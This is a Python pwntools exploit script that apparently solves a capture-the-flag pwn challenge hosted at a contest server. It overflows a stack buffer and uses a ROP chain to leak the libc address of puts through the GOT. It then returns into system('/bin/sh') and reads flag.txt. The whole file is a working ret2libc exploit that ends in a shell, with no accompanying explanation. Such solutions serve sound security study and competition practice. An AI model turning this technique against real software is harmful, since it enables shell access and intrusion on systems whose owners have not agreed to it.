#!/usr/bin/env python3
from pwn import *

# Handout: chall.c, bin/chall, Dockerfile

def send_one_line(p, line):
    assert b"\n" not in line, line
    # The program reads at most 63 chars and adds a 0 at the end
    if len(line) < 63:
        p.sendline(line)
    elif len(line) == 63:
        p.send(line)
    elif len(line) == 64:
        assert line[63] == 0, line
        p.send(line[0:63])
    else:
        assert False, line

def puts_addr_and_ret_to_main(addr):
    chall = context.binary
    rop = ROP(chall)

    rop(rdi = p64(addr))
    rop.raw(p64(0x004011d6))

    rop.raw(p64(0)) # for pop rbp at the end of main
    rop.raw(p64(chall.symbols["main"]))

    return bytes(rop)

def read_bytes_and_ret_to_main(pointer, length):
    value = b""
    for i in range(length):
        if i == len(value):
            send_one_line(p, b"x" * (16 + 8) + puts_addr_and_ret_to_main(pointer + i))
            data = p.recvuntil(b"\nWhere am I going today?\n", drop=True)
            value += data
            value += b"\0"
    return value[0:length]

if __name__ == "__main__":
    # context.log_level = "debug"
    context.binary = chall = ELF("bin/chall")

    # print(chall.libc)
    # rop = ROP([chall, chall.libc])
    # for g in rop.gadgets.values():
    #     print(g)

    # r8 points to the buffer
    # rbp = 0x0
    # binsh = b"/bin/sh"
    # buffer = binsh + b"x" * (16 - len(binsh)) + p64(rbp) + p64(231090) + b"\n"

    # print(rop.dump())
    # assert len(buffer) <= 64, len(buffer)

    # with gdb.debug(chall.path) as p:
    # with gdb.debug(chall.path, gdbscript="continue") as p:
    # with process(chall.path) as p:
    with remote("tjc.tf", 31705) as p:
        p.recvline() # Where am I going today?

        print("puts", hex(chall.symbols["puts"]))
        puts_ptr = u64(read_bytes_and_ret_to_main(chall.symbols["got.puts"], 8))
        print("puts_ptr", hex(puts_ptr))

        libc = ELF(chall.libc.path)
        libc = ELF("docker/lib/libc.so.6")
        libc = ELF("docker/srv/lib/x86_64-linux-gnu/libc-2.31.so")
        libc.address = puts_ptr - libc.symbols["puts"]
        print("libc.address", hex(libc.address))
        assert libc.symbols["puts"] == puts_ptr

        bin_sh = next(libc.search(b"/bin/sh\x00"))
        system = libc.symbols["system"]
        print("bin_sh", hex(bin_sh), "system", hex(system))

        rop = ROP(chall)
        rop(rdi = p64(bin_sh))
        rop.raw(rop.find_gadget(["ret"]).address) # required in ubuntu docker
        rop.raw(p64(system))
        print(rop.dump())
        send_one_line(p, b"x" * (16 + 8) + bytes(rop))

        if True:
            pause(1)
            p.sendline(b"cat flag.txt\n")
            print(p.recvall(timeout = 1))
        else:
            p.interactive()

